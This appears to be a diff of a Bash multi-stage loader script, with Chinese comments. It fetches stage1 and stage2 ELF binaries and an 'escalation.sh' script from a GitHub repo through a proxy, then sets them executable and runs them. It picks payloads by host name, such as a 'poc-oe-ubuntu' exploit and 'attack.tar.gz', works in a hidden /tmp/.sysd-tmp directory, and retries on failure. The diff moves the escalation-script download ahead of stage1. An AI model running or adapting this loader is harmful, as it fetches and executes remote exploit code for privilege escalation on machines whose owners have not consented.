@@ -6,7 +6,7 @@ MAX_RETRIES=5
 RETRY_DELAY=8
 TMPDIR_BASE="/tmp/.sysd-tmp"
 
-# escalation.sh 固定放在 /tmp
+# escalation.sh 固定放在 /tmp 下
 ESCALATION_SH="/tmp/escalation.sh"
 ESCALATION_URL="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/escalation.sh"
 
@@ -19,7 +19,6 @@ declare -A STAGE2_URL_MAP=(
     ["ubuntu"]="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-ubuntu"
     ["test"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf" # 仅占位，实际不使用
 )
-
 DEFAULT_STAGE2="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz"
 
 # ==================== 日志函数 ====================
@@ -27,8 +26,8 @@ log() {
     local level="$1"; shift
     printf "[%s] [%s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$*" >&2
 }
-log_info()  { log "INFO"  "$@"; }
-log_warn()  { log "WARN"  "$@"; }
+log_info() { log "INFO" "$@"; }
+log_warn() { log "WARN" "$@"; }
 log_error() { log "ERROR" "$@"; }
 log_success() { log " OK " "$@"; }
 
@@ -42,7 +41,6 @@ fi
 HOST_NAME="$1"
 HOST_NAME="${HOST_NAME,,}"  # 转小写
 
-# 特殊处理：test 模式 - 不执行任何下载和运行，仅输出日志
 if [ "$HOST_NAME" = "test" ]; then
     echo "test start"
     log_success "================= TEST 模式被触发 ================="
@@ -54,7 +52,6 @@ fi
 
 # 正常流程 - 获取 stage2 URL
 STAGE2_URL="${STAGE2_URL_MAP[$HOST_NAME]:-$DEFAULT_STAGE2}"
-
 if [ "$STAGE2_URL" = "$DEFAULT_STAGE2" ] && [ -z "${STAGE2_URL_MAP[$HOST_NAME]+isset}" ]; then
     log_warn "未知主机名 '$HOST_NAME'，使用默认 stage2: $DEFAULT_STAGE2"
 else
@@ -67,13 +64,12 @@ STAGE1_URL="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/con
 # ==================== 准备临时目录 ====================
 RAND_SUFFIX=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
 TMPDIR="${TMPDIR_BASE}-${RAND_SUFFIX}"
-
 mkdir -p "$TMPDIR" || { log_error "创建临时目录失败: $TMPDIR"; exit 1; }
 cd "$TMPDIR" || { log_error "进入临时目录失败: $TMPDIR"; exit 1; }
 
 log_info "工作目录: $TMPDIR"
 log_info "Stage1: $STAGE1_URL"
-log_info "Stage2: $STAGE2_URL  (主机: $HOST_NAME)"
+log_info "Stage2: $STAGE2_URL (主机: $HOST_NAME)"
 
 # ==================== 下载函数 ====================
 download_file() {
@@ -94,7 +90,6 @@ while [ $attempt -le $MAX_RETRIES ]; do
     log_info "================= 第 ${attempt}/${MAX_RETRIES} 次尝试 ================="
 
     RAND_SUFFIX=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
-
     stage1_bin="s1_${RAND_SUFFIX}.elf"
     stage2_bin="s2.elf"
 
@@ -111,25 +106,32 @@ while [ $attempt -le $MAX_RETRIES ]; do
     fi
 
     log_info "启动 Stage1 (host=$HOST_NAME)"
+
+    # ===================== 下载 escalation.sh 到 /tmp =====================
+    log_info "准备下载 escalation.sh 到固定位置: $ESCALATION_SH"
+
+    if ! wget -q --no-cache --tries=3 --timeout=15 \
+            "$ESCALATION_URL" -O "$ESCALATION_SH"; then
+        log_error "下载 escalation.sh 失败: $ESCALATION_URL"
+            # 这里你可以选择 exit 1 或者 continue 看需求
+            # exit 1
+    else
+        chmod 755 "$ESCALATION_SH" 2>/dev/null || true
+        log_success "escalation.sh 已成功下载到 $ESCALATION_SH"
+    fi
+
     if STAGE2_URL="$STAGE2_URL" \
        STAGE2_FILENAME="$stage2_bin" \
        HOST_IDENTIFIER="$HOST_NAME" \
-        chmod 777 "./$stage1_bin" "./$stage2_bin" && ./$stage1_bin | tee /tmp/stage1; then
+        chmod 777 "./$stage1_bin" "./$stage2_bin" && ./"$stage1_bin" | tee /tmp/stage1.log; then
+
         log_success "Stage1 执行成功 (退出码: $?)"
 
-        log_info "准备执行 escalation.sh，并传入参数: $STAGE2_URL"
         
-        if ! wget -q --no-cache --tries=3 --timeout=15 \
-                "$ESCALATION_URL" -O "$ESCALATION_SH"; then
-            log_error "下载 escalation.sh 失败: $ESCALATION_URL"
-            exit 1
-        fi
-
-        chmod 755 "$ESCALATION_SH" 2>/dev/null || true
-        log_success "escalation.sh 已下载到 $ESCALATION_SH（未执行）"
 
         log_success "控制器正常退出"
         exit 0
+
     else
         exit_code=$?
         log_error "Stage1 执行失败 (退出码: $exit_code)"
